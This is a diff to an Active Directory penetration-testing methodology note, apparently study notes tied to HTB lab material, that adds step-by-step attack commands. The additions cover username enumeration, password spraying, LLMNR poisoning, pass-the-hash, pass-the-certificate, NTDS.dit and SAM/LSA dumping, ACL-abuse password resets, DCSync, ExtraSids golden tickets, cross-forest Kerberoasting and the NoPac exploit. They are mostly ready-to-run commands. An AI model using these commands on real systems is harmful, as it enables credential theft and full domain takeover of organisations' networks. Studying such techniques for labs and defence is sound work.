@@ -95,27 +95,160 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 
 // Shortest path to Domain Admins
 // Pre-built query in BloodHound
+
+// CanPSRemote — who can WinRM into what
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
+MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer)
+RETURN p2
+
+// SQLAdmin — who has SQL admin rights on which host
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
+MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer)
+RETURN p2
 ```
+
+**bloodhound-python — Remote collection from Kali (no WinRM/RDP needed):**
+```bash
+pip3 install bloodhound
+bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
+zip -r bh_data.zip *.json   # then import zip into BloodHound GUI
+```
+
+#### Step 8: ACL Enumeration
+
+```powershell
+# Get current user's SID
+$sid = Convert-NameToSid <username>
+
+# Find ACEs where the current user has interesting rights on other objects
+# -ResolveGUIDs translates GUIDs to human-readable names (always use this)
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+# Key fields: ObjectDN, AceType, ActiveDirectoryRights, ObjectAceType
+
+# Scope to a specific OU to avoid timing out on large domains
+Get-DomainObjectACL -ResolveGUIDs -Identity * -domain DOMAIN.LOCAL \
+  -SearchBase "LDAP://OU=Users,DC=DOMAIN,DC=LOCAL"
+```
+
+Exploitable ACE types:
+- `GenericAll` = full control (password reset, add to group, set SPN)
+- `GenericWrite` = write attributes (set SPN for targeted Kerberoast)
+- `User-Force-Change-Password` = reset password without knowing current
+- `Self-Membership` = add yourself to a group
+- `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` = DCSync
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.9. ACL Enumeration|AD.9]]
+
+#### Step 9: SPN / Kerberoast Candidate Discovery
+
+```powershell
+# PowerView
+Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+
+# Windows built-in (no tools required)
+setspn -Q */*
+```
+
+#### Step 10: UAC Flag Hunting
+
+```powershell
+# Accounts with no pre-auth (AS-REP Roasting candidates)
+Get-DomainUser -PreauthNotRequired
+
+# Accounts with PASSWD_NOTREQD (blank password possible)
+Get-DomainUser -UACFilter PASSWD_NOTREQD
+
+# Accounts with reversible encryption (cleartext derivable from DCSync)
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
+```
+
+#### Step 11: Snaffler Domain-Wide Credential Hunt
+
+```cmd
+:: From domain-joined Windows machine (domain-aware share crawl)
+Snaffler.exe -d DOMAIN.LOCAL -s -v data
+```
+
+Full reference: [[Password Attacks (HTB Supplementary)#PA.17.4. Snaffler — Automated Interesting-File Finder|PA.17.4]] (per-host), [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.7.2. Snaffler Domain-Wide Scan|AD.7.2]] (domain-wide)
 
 ---
 
 ### Phase 2: Initial Access
 
-#### Step 1: Password Attacks
+#### Step 1: Username Enumeration (before spraying)
+
+If you don't have a confirmed username list yet, generate candidates first:
+```bash
+# Generate username formats from a name list (first.last, f.last, flast, etc.)
+username-anarchy -i names.txt > candidate_users.txt
+
+# Validate candidates against Kerberos WITHOUT triggering lockouts
+kerbrute userenum -d <domain> --dc <DC-IP> candidate_users.txt
+# Also try standard wordlists:
+kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+Valid usernames returned by kerbrute (Kerberos says "pre-auth required" vs "no such user") are safe to spray.
+
+Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute — Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]
+
+#### Tags: #kerbrute #usernameAnarchy #ADEnumeration #HTBSupplementary
+
+---
+
+#### Step 1.5: Password Policy (before spraying — critical)
+
+```bash
+# From Linux, authenticated
+crackmapexec smb <DC_IP> -u user -p pass --pass-pol
+# → [+] Minimum password length: 8 | Lockout threshold: 5 attempts
+
+# From Linux, rpcclient
+rpcclient -U "DOMAIN\\user%pass" <DC_IP> -c "getdompwinfo"
+# → minPasswordLength: 8
+
+# From Windows, PowerView
+(Get-DomainPolicy)."system access"
+# → MinimumPasswordLength = 8; LockoutBadCount = 5
+```
+
+Default Windows domain minimum: **7 characters** (no custom policy applied). Lockout threshold of 0 = no lockout, spray freely.
+
+#### Step 1.6: LLMNR/NBT-NS Poisoning from Windows (Inveigh)
+
+When you have a Windows foothold and can't run Responder from Kali:
+```powershell
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+# Captures NTLMv2 hashes from the local network segment
+# Ctrl+C to stop; read captures: type Inveigh-NTLMv2.txt
+```
+
+Crack captures with `hashcat -m 5600`. Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.3. LLMNR/NBT-NS Poisoning from Windows — Inveigh|AD.3]]
+
+#### Step 2: Password Spraying
 
 **Password Spraying**:
 ```bash
-# CrackMapExec
+# CrackMapExec / NetExec
 crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success
+nxc smb <target> -u users.txt -p 'Password123!' --continue-on-success
 
-# Kerbrute (Kerberos)
+# Kerbrute (Kerberos — faster, less log noise than SMB spray)
 kerbrute passwordspray -d domain.com --dc <dc_ip> users.txt "Password123!"
 
-# Hydra
+# Hydra (for RDP/WinRM where Kerberos isn't the auth path)
 hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
 ```
 
-#### Step 2: AS-REP Roasting
+**From Windows foothold — DomainPasswordSpray.ps1 (pulls user list from AD automatically):**
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -ErrorAction SilentlyContinue
+```
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows — DomainPasswordSpray|AD.5]]
+
+#### Step 3: AS-REP Roasting
 ```bash
 # Rubeus
 Rubeus.exe asreproast /nowrap
@@ -127,7 +260,7 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast domain
 hashcat -m 18200 hashes.asreproast rockyou.txt --force
 ```
 
-#### Step 3: Kerberoasting
+#### Step 4: Kerberoasting
 ```bash
 # Rubeus
 Rubeus.exe kerberoast /outfile:hashes.kerberoast
@@ -139,20 +272,24 @@ impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user
 hashcat -m 13100 hashes.kerberoast rockyou.txt --force
 ```
 
-#### Step 4: Pass-the-Hash
+#### Step 5: Pass-the-Hash
 ```bash
 # impacket
 impacket-psexec -hashes :<ntlm_hash> domain/user@<target>
 impacket-wmiexec -hashes :<ntlm_hash> domain/user@<target>
 
-# CrackMapExec
+# CrackMapExec / NetExec
 crackmapexec smb <target> -u user -H <ntlm_hash>
+nxc smb <target> -u user -H <ntlm_hash>
 
 # smbclient
 smbclient \\\\<target>\\share -U user --pw-nt-hash <ntlm_hash>
+
+# RDP (requires DisableRestrictedAdmin=0 on target)
+xfreerdp /v:<target> /u:user /pth:<ntlm_hash>
 ```
 
-#### Step 5: Overpass-the-Hash
+#### Step 6: Overpass-the-Hash
 ```cmd
 # Mimikatz
 sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlm_hash> /run:powershell
@@ -160,6 +297,26 @@ sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlm_hash> /run:powershell
 # In new PowerShell session
 net use \\fileserver
 ```
+
+#### Step 7: Pass-the-Certificate (when you have write access to an AD computer object)
+
+Requires: GenericWrite or WriteProperty on a machine account's `ms-DS-KeyCredentialLink` attribute.
+```bash
+# 1. Add shadow credential to the machine account
+python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <machine$> --action add
+# Note the pfx filename and password printed by pywhisker
+
+# 2. Get TGT via PKINIT (oscrypto pin may be needed first: pip3 install oscrypto==1.3.0)
+python3 gettgtpkinit.py <domain>/<machine$> out.ccache -cert-pfx <pfx-file> -pfx-pass <pfx-pass>
+
+# 3. Use the TGT
+export KRB5CCNAME=out.ccache
+evil-winrm -i <target> -r <domain>         # WinRM
+smbclient -k -N //<target>/share           # SMB with Kerberos
+```
+Full reference: [[Password Attacks (HTB Supplementary)#PA.17 Pass the Certificate (PtC)|PA.17]], [[Secrets & Credentials (Decision Tree)#Got write access to an AD computer object|Decision Tree]]
+
+#### Tags: #PassTheCertificate #PtC #pywhisker #PKINITtools #HTBSupplementary
 
 ---
 
@@ -182,22 +339,60 @@ lsadump::dcsync /user:domain\krbtgt
 
 **Hash Dumping**:
 ```bash
-# impacket
+# impacket (remote)
 impacket-secretsdump domain/user:password@<dc_ip>
 impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
+
+# NetExec one-liners (no shell needed, just creds)
+nxc smb <target> -u user -p pass --sam
+nxc smb <target> -u user -p pass --lsa
+nxc smb <dc_ip>  -u user -p pass --ntds
 ```
 
-#### Step 2: Pass-the-Ticket
+**Snaffler** (share and file credential hunting — run from domain-joined machine):
 ```cmd
-# Export tickets
+.\Snaffler.exe -d <domain> -o snaffler_output.log -v data
+```
+Finds credentials in readable shares: configs, scripts, backup files, .git repos, etc.
+
+**NTDS.dit via Volume Shadow Copy** (DC access, avoids file lock):
+```cmd
+vssadmin CREATE SHADOW /For=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
+```
+Then exfil + crack: `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`
+
+#### Step 2: Pass-the-Ticket
+
+**Windows (kirbi files):**
+```cmd
+# Export tickets from current session
 sekurlsa::tickets /export
 
-# Import ticket
+# Import a .kirbi ticket into the current session
 kerberos::ptt ticket.kirbi
 
 # Verify
 klist
 ```
+
+**Linux (ccache files):**
+```bash
+# Find existing ccache files
+ls -la /tmp/krb5cc_*
+
+# Activate one
+export KRB5CCNAME=/tmp/krb5cc_<id>
+
+# Or extract from a .keytab
+python3 keytabextract.py <file.keytab>
+kinit <user>@DOMAIN -k -t <file.keytab>
+
+# Use it
+smbclient -k -N //<target>/share
+```
+Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket — Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket — Linux|PA.16]]
 
 #### Step 3: Golden Ticket
 ```cmd
@@ -309,3 +504,138 @@ socks5 127.0.0.1 1080
 proxychains nmap -sT 172.16.0.0/24
 proxychains crackmapexec smb 172.16.0.0/24 -u user -p password
 ```
+
+---
+
+### Phase 3 (additions)
+
+#### Step 5: ACL Abuse Chain
+
+When you find exploitable ACEs (from Phase 1 Step 8 enumeration), the PSCredential pattern lets you chain multi-hop abuse:
+
+```powershell
+# Build credential object for the account you've compromised
+$passwd = ConvertTo-SecureString "plaintext" -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $passwd)
+
+# ForceChangePassword ACE: reset target's password
+$newPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+Set-DomainUserPassword -Identity <target_user> -AccountPassword $newPass -Credential $Cred -Verbose
+
+# GenericAll/Self-Membership ACE: add user to a group
+$Cred2 = New-Object System.Management.Automation.PSCredential('DOMAIN\<target_user>', $newPass)
+Add-DomainGroupMember -Identity 'Privileged Group' -Members '<target_user>' -Credential $Cred2 -Verbose
+
+# GenericWrite/GenericAll ACE: set SPN for targeted Kerberoasting
+Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+# Then Kerberoast: .\Rubeus.exe kerberoast /user:<high_value_user> /nowrap
+# Cleanup: Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -Clear serviceprincipalname
+```
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10]]
+
+#### Step 6: DCSync with runas /netonly (non-domain machine)
+
+When you're not on a domain-joined machine but have domain credentials with DS-Replication rights:
+```cmd
+rem Spawn cmd with network auth as the domain user
+runas /netonly /user:DOMAIN\user "cmd.exe"
+```
+
+Then inside the new cmd, run mimikatz:
+```mimikatz
+lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
+```
+
+For accounts with reversible encryption (ENCRYPTED_TEXT_PWD_ALLOWED), cleartext appears in DCSync output.
+
+---
+
+### Phase 5: Domain Trust Attacks
+
+#### Step 1: Enumerate Trusts
+
+```powershell
+# PowerView
+Get-DomainTrustMapping
+# Shows: SourceName, TargetName, TrustType (WITHIN_FOREST/FOREST_TRANSITIVE), TrustDirection
+
+# Windows built-in
+netdom query /domain:DOMAIN.LOCAL trust
+```
+
+Trust types:
+- `WITHIN_FOREST` = child-parent, SID filtering NOT applied. ExtraSids attack works.
+- `FOREST_TRANSITIVE` = cross-forest, SID filtering applied. Only Kerberoasting/credential reuse.
+
+#### Step 2: Child→Parent Escalation (ExtraSids Golden Ticket)
+
+From a compromised child domain:
+```powershell
+# Get child domain SID
+Get-DomainSID   # → S-1-5-21-CHILD...
+
+# Get Enterprise Admins SID from parent
+Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.DOMAIN.LOCAL
+# → ObjectSID: S-1-5-21-PARENT...-519
+```
+
+```mimikatz
+# DCSync the child KRBTGT
+lsadump::dcsync /user:CHILD\krbtgt
+```
+
+```cmd
+rem Forge golden ticket with ExtraSids (parent Enterprise Admins SID injected)
+.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> /domain:CHILD.PARENT.LOCAL ^
+  /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt
+klist
+rem Verify: ls \\parentdc.parent.local\c$
+```
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows — ExtraSids)|AD.16]]
+
+**Linux — raiseChild.py (automated):**
+```bash
+impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Administrator:pass
+```
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux — raiseChild.py)|AD.17]]
+
+#### Step 3: Cross-Forest Kerberoasting
+
+```cmd
+rem Windows: Rubeus with /domain: for external forest
+.\Rubeus.exe kerberoast /domain:FOREIGN.FOREST.LOCAL /rc4opsec /nowrap
+```
+
+```bash
+# Linux: GetUserSPNs.py with -target-domain
+GetUserSPNs.py -target-domain FOREIGN.FOREST.LOCAL OUROWN.LOCAL/user:pass -dc-ip <DC_IP> -request
+# Crack with hashcat -m 13100
+# Use cracked credentials: smbexec.py FOREIGN.FOREST.LOCAL/user:pass@<foreign_dc_ip>
+```
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.18. Cross-Forest Trust Abuse (Windows)|AD.18]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.19. Cross-Forest Trust Abuse (Linux)|AD.19]]
+
+---
+
+### Bleeding Edge (CVE-based)
+
+#### NoPac — CVE-2021-42278 + CVE-2021-42287
+
+Any low-priv domain user can impersonate a DC and get SYSTEM:
+```bash
+# Scan first
+python3 scanner.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap
+
+# Exploit
+python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap \
+  -shell --impersonate administrator
+```
+
+Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.13. Bleeding Edge: NoPac (CVE-2021-42278 + CVE-2021-42287)|AD.13]]
+
+---
+
+#### Tags: #ActiveDirectory #ADEnum #ADAttacks #BloodHound #PowerView #Kerberoasting #ASREPRoasting #DCSync #GoldenTicket #PtH #PtT #PtC #ACLAbuse #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Methodology
